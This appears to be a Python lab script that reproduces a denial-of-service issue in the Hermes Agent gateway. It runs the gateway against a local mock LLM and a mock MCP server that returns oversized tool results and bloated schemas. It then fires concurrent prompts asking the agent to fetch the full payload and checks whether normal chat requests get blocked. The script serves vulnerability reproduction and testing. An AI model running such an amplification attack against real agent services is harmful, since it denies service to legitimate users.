import concurrent.futures
import json
import os
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path


def find_lab_root():
    current = Path(__file__).resolve()
    for candidate in (current.parent, *current.parents):
        if (candidate / ".venv" / "Scripts" / "python.exe").exists() and (candidate / "scripts").is_dir():
            return candidate
    return current.parents[1]


ROOT = find_lab_root()
VENV = ROOT / ".venv"
HOME = ROOT / "home_mcp"
REPORTS = ROOT / "reports"
LOGS = REPORTS / "logs"

API_HOST = "127.0.0.1"
API_PORT = int(os.environ.get("HERMES_MCP_API_PORT", "18645"))
API_BASE = f"http://{API_HOST}:{API_PORT}"
MOCK_PORT = int(os.environ.get("MCP_MOCK_LLM_PORT", "18083"))
MOCK_BASE = f"http://127.0.0.1:{MOCK_PORT}"
API_KEY = "hermes-mcp-dos-lab-local-key-2026"
MODEL = "hermes-mcp-mock"

RESULT_MB = int(os.environ.get("MCP_RESULT_MB", "12"))
SCHEMA_TOOL_COUNT = int(os.environ.get("MCP_SCHEMA_TOOL_COUNT", "48"))
SCHEMA_DESC_KB = int(os.environ.get("MCP_SCHEMA_DESC_KB", "24"))
CONCURRENCY = int(os.environ.get("MCP_DOS_CONCURRENCY", "2"))
CLIENT_TIMEOUT = float(os.environ.get("MCP_DOS_CLIENT_TIMEOUT", "10"))
SHARED_RUN_LIMIT = int(os.environ.get("MCP_DOS_SHARED_RUN_LIMIT", str(CONCURRENCY)))
NORMAL_PROBE_TIMEOUT = float(os.environ.get("MCP_NORMAL_PROBE_TIMEOUT", "5"))
FINAL_DELAY = float(os.environ.get("MOCK_LLM_AFTER_TOOL_DELAY", "30"))


AGENT_TASK_SAMPLE = (
    "Please inspect the connected MCP diagnostic bundle. "
    "Use the available MCP diagnostic resource/tool to fetch the complete payload, "
    "then summarize the contents and include relevant raw details for follow-up analysis."
)


def ts():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def request_json(method, url, payload=None, timeout=10):
    data = None
    headers = {"Authorization": f"Bearer {API_KEY}"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    start = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            parsed = json.loads(body.decode("utf-8") or "{}")
            return {"ok": True, "status": resp.status, "latency": time.time() - start, "body": parsed}
    except urllib.error.HTTPError as exc:
        body = exc.read()
        try:
            parsed = json.loads(body.decode("utf-8") or "{}")
        except Exception:
            parsed = body.decode("utf-8", errors="replace")
        return {"ok": False, "status": exc.code, "latency": time.time() - start, "body": parsed}
    except Exception as exc:
        return {"ok": False, "status": None, "latency": time.time() - start, "error": repr(exc)}


def wait_ready(url, timeout=60):
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        last = request_json("GET", url, timeout=2)
        if last.get("ok"):
            return True, last
        time.sleep(0.5)
    return False, last


def yaml_path(path):
    return str(path).replace("\\", "/")


def write_config(metrics_file):
    HOME.mkdir(parents=True, exist_ok=True)
    python_exe = yaml_path(VENV / "Scripts" / "python.exe")
    mcp_server = yaml_path(ROOT / "scripts" / "mock_mcp_amplify_server.py")
    metrics = yaml_path(metrics_file)
    (HOME / "config.yaml").write_text(
        f"""model:
  provider: custom
  default: {MODEL}
  base_url: http://127.0.0.1:{MOCK_PORT}/v1
  api_key: local-mock-key
  api_mode: chat_completions
agent:
  max_turns: 4
  api_max_retries: 1
  gateway_timeout: 120
gateway:
  api_server:
    max_concurrent_runs: {SHARED_RUN_LIMIT}
platforms:
  api_server:
    enabled: true
    extra:
      key: {API_KEY}
      host: {API_HOST}
      port: {API_PORT}
mcp_servers:
  amplify:
    command: "{python_exe}"
    args:
      - "{mcp_server}"
    enabled: true
    timeout: 120
    connect_timeout: 30
    tools:
      resources: true
      prompts: false
    env:
      MCP_RESULT_MB: "{RESULT_MB}"
      MCP_SCHEMA_TOOL_COUNT: "{SCHEMA_TOOL_COUNT}"
      MCP_SCHEMA_DESC_KB: "{SCHEMA_DESC_KB}"
      MCP_METRICS_FILE: "{metrics}"
      PYTHONIOENCODING: "utf-8"
""",
        encoding="utf-8",
    )


def start_processes(metrics_file):
    LOGS.mkdir(parents=True, exist_ok=True)
    mock_log = open(LOGS / "mock_llm_mcp.log", "w", encoding="utf-8", buffering=1)
    gateway_log = open(LOGS / "hermes_gateway_mcp.log", "w", encoding="utf-8", buffering=1)

    mock_env = os.environ.copy()
    mock_env.update(
        {
            "MOCK_LLM_PORT": str(MOCK_PORT),
            "MOCK_LLM_MODEL": MODEL,
            "MCP_RESULT_MB": str(RESULT_MB),
            "MOCK_LLM_AFTER_TOOL_DELAY": str(FINAL_DELAY),
        }
    )
    mock = subprocess.Popen(
        [str(VENV / "Scripts" / "python.exe"), str(ROOT / "scripts" / "mock_llm_mcp_toolcaller.py")],
        cwd=str(ROOT),
        env=mock_env,
        stdout=mock_log,
        stderr=subprocess.STDOUT,
        text=True,
    )

    gateway_env = os.environ.copy()
    gateway_env.update(
        {
            "HERMES_HOME": str(HOME),
            "API_SERVER_ENABLED": "true",
            "API_SERVER_KEY": API_KEY,
            "API_SERVER_PORT": str(API_PORT),
            "API_SERVER_HOST": API_HOST,
            "OPENAI_API_KEY": "local-mock-key",
            "NO_PROXY": "127.0.0.1,localhost",
            "HERMES_ACCEPT_HOOKS": "1",
            "MCP_METRICS_FILE": str(metrics_file),
        }
    )
    gateway = subprocess.Popen(
        [str(VENV / "Scripts" / "hermes.exe"), "gateway", "run", "--accept-hooks"],
        cwd=str(ROOT),
        env=gateway_env,
        stdout=gateway_log,
        stderr=subprocess.STDOUT,
        text=True,
    )
    return mock, gateway, mock_log, gateway_log


def stop_process(proc):
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=8)
        except Exception:
            proc.kill()


def post_prompt(i, timeout=CLIENT_TIMEOUT):
    return request_json(
        "POST",
        f"{API_BASE}/v1/chat/completions",
        {
            "model": MODEL,
            "messages": [
                {
                    "role": "user",
                    "content": (
                        f"normal user task #{i}: {AGENT_TASK_SAMPLE}"
                    ),
                }
            ],
            "stream": False,
        },
        timeout=timeout,
    )


def normal_probe(label, timeout=NORMAL_PROBE_TIMEOUT, emit=True):
    probe = request_json("POST", f"{API_BASE}/v1/chat/completions", {
        "model": MODEL,
        "messages": [{"role": "user", "content": f"legitimate normal chat probe: {label}"}],
        "stream": False,
    }, timeout=timeout)
    latency_ms = int(float(probe.get("latency") or 0) * 1000)
    if emit:
        print(
            f"[{ts()}] {label} endpoint=/v1/chat/completions "
            f"timeout_s={timeout:g} mock_llm_normal_delay_s=0 "
            f"ok={probe.get('ok')} status={probe.get('status')} latency_ms={latency_ms} "
            f"detail={probe.get('body') or probe.get('error')}",
            flush=True,
        )
    return probe


def warmup_normal_probe():
    for attempt in range(1, 4):
        probe = normal_probe(f"warmup_probe#{attempt}", timeout=30, emit=False)
        latency_ms = int(float(probe.get("latency") or 0) * 1000)
        print(
            f"[{ts()}] warmup_probe#{attempt} ok={probe.get('ok')} "
            f"status={probe.get('status')} latency_ms={latency_ms}",
            flush=True,
        )
        if probe.get("ok"):
            return True
        time.sleep(1)
    return False


def read_mcp_metrics(metrics_file):
    if not metrics_file.exists():
        return []
    rows = []
    for line in metrics_file.read_text(encoding="utf-8", errors="replace").splitlines():
        try:
            rows.append(json.loads(line))
        except Exception:
            pass
    return rows


def run_attack(metrics_file):
    print(
        f"[{ts()}] agent_task_sample endpoint=/v1/chat/completions "
        f'prompt="{AGENT_TASK_SAMPLE}"',
        flush=True,
    )
    print(
        f"[{ts()}] prompt_mcp_amplification_start endpoint=/v1/chat/completions "
        f"concurrency={CONCURRENCY} shared_run_limit={SHARED_RUN_LIMIT} "
        f"normal_probe_timeout_s={NORMAL_PROBE_TIMEOUT:g} result_mb={RESULT_MB} "
        f"schema_tools={SCHEMA_TOOL_COUNT} schema_desc_kb={SCHEMA_DESC_KB}",
        flush=True,
    )
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as pool:
        futures = [pool.submit(post_prompt, i) for i in range(CONCURRENCY)]
        time.sleep(3)
        llm_metrics = request_json("GET", f"{MOCK_BASE}/metrics", timeout=5)
        print(f"[{ts()}] mock_llm_metrics_during {llm_metrics.get('body')}", flush=True)
        health = request_json("GET", f"{API_BASE}/health", timeout=3)
        print(f"[{ts()}] health_during_attack ok={health.get('ok')} status={health.get('status')}", flush=True)
        probe_during = normal_probe("normal_probe_during_attack")
        if (not probe_during.get("ok")) or probe_during.get("status") in {429, 503}:
            print(
                f"[{ts()}] SERVICE_UNAVAILABLE normal_probe_blocked_by_mcp_amplification "
                f"status={probe_during.get('status')} detail={probe_during.get('body') or probe_during.get('error')}",
                flush=True,
            )
        for fut in concurrent.futures.as_completed(futures):
            results.append(fut.result())

    status_counts = {}
    for r in results:
        key = r.get("status")
        if key is None and "TimeoutError" in str(r.get("error", "")):
            key = "timeout"
        status_counts[key] = status_counts.get(key, 0) + 1
    print(f"[{ts()}] prompt_mcp_amplification_done statuses={status_counts}", flush=True)

    final_llm = request_json("GET", f"{MOCK_BASE}/metrics", timeout=5)
    mcp_rows = read_mcp_metrics(metrics_file)
    total_tool_bytes = sum(int(r.get("result_bytes") or 0) for r in mcp_rows if r.get("event") in {"tool_call", "resource_read"})
    print(f"[{ts()}] mock_llm_metrics_after {final_llm.get('body')}", flush=True)
    print(f"[{ts()}] mcp_metrics_events={len(mcp_rows)} returned_bytes={total_tool_bytes}", flush=True)
    for i in range(3):
        probe = normal_probe(f"recovery_probe#{i+1}", timeout=NORMAL_PROBE_TIMEOUT)
        if probe.get("ok"):
            break
        time.sleep(1)

    llm_body = final_llm.get("body") or {}
    service_unavailable = (
        (not probe_during.get("ok"))
        or probe_during.get("status") in {429, 503}
    )
    reproduced = (
        llm_body.get("tool_call_responses", 0) >= 1
        and (llm_body.get("after_tool_requests", 0) >= 1 or total_tool_bytes >= RESULT_MB * 1024 * 1024)
        and service_unavailable
    )
    if reproduced:
        print(f"[{ts()}] RESULT=UNAVAILABLE mcp_amplification_blocked_normal_chat_shared_run_limit", flush=True)
        return 0
    print(f"[{ts()}] RESULT=NOT_REPRODUCED results={status_counts} llm={llm_body}", flush=True)
    return 1


def main():
    REPORTS.mkdir(parents=True, exist_ok=True)
    LOGS.mkdir(parents=True, exist_ok=True)
    metrics_file = LOGS / "mcp_amplify_metrics.jsonl"
    if metrics_file.exists():
        metrics_file.unlink()
    write_config(metrics_file)

    print("Hermes Agent MCP tool/resource amplification DoS reproduction", flush=True)
    print(f"[{ts()}] lab_root={ROOT}", flush=True)
    print(f"[{ts()}] normal_agent_task_sample={AGENT_TASK_SAMPLE}", flush=True)

    mock = gateway = None
    handles = []
    try:
        mock, gateway, *handles = start_processes(metrics_file)
        ok, detail = wait_ready(f"{MOCK_BASE}/v1/models", timeout=20)
        print(f"[{ts()}] mock_ready={ok} detail={detail}", flush=True)
        ok, detail = wait_ready(f"{API_BASE}/health", timeout=90)
        print(f"[{ts()}] hermes_health_ready={ok} detail={detail}", flush=True)
        if not ok:
            print(f"[{ts()}] RESULT=SETUP_FAILED see {LOGS}", flush=True)
            return 2
        if not warmup_normal_probe():
            print(f"[{ts()}] RESULT=SETUP_FAILED warmup normal probe did not complete", flush=True)
            return 2
        normal_probe("baseline_normal_probe", timeout=NORMAL_PROBE_TIMEOUT)
        time.sleep(1)
        return run_attack(metrics_file)
    finally:
        stop_process(gateway)
        stop_process(mock)
        for handle in handles:
            try:
                handle.close()
            except Exception:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
